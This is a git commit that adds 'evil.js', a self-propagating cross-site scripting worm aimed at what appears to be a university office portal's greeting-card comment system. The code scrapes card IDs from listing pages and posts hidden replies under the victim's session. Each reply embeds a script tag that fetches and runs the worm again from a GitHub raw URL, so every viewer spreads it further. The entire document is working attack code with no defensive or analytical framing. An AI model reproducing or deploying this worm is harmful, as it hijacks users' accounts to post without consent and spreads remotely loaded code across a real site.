4275948662d4c56509c2761a8500e1864d0c13b3
hellosamy2005 <hellosamy2005@gmail.com>
2013-12-04 19:09:18 +0800

    Create evil.js

---
+++ evil.js
@@ -0,0 +1,24 @@
+
+evilStr='<div style=display:none >"},{\'optorName\':\'管理员\',\'replyContent\':\'&nbsp;大家多多评论&nbsp;&nbsp;&nbsp;"></div> <div style="display:none"><script>$.getScript("https://raw.github.com/hellosamy2005/samy/master/evil.js")</script><br "\',\'dept\':\'CUC\',"imgUrl":"/office/pubjsp/tiles/images/Portal/nmember.gif';  
+
+
+function sendCommentFromPageRegExp(url,regExpStr,msg){
+    $.get(url,function(data){
+        var pat=new RegExp(regExpStr,"g");
+        var result;
+        while((result=pat.exec(data))!=null){
+            var  sendurl="/office/cucCard/cucCardAction_queryReplyByPage.so?sendId="+result[1];
+            var evilMsg=msg+evilStr;
+            $.get(sendurl,function(jsonData){
+            	    console.info(jsonData);
+					if(jsonData.indexOf("getScript")<0){
+				         //console.info("y:");
+				         $.post("/office/cucCard/cucCardAction_reply.so",{sendId:result[1],content:evilMsg,ifSendCard:"00"});
+				    }
+            });
+        }
+    })
+}
+
+sendCommentFromPageRegExp("/office/cucCard/cucCardAction_sendOverAll.so","officeImages/upload/cucCard/result/\\d+\.png','(\\d+)'","好人啊！");
+sendCommentFromPageRegExp("/office/cucCard/cucCardAction_receiveOverAll.so","officeImages/upload/cucCard/result/\\d+\.png','(\\d+)'","谢谢！");
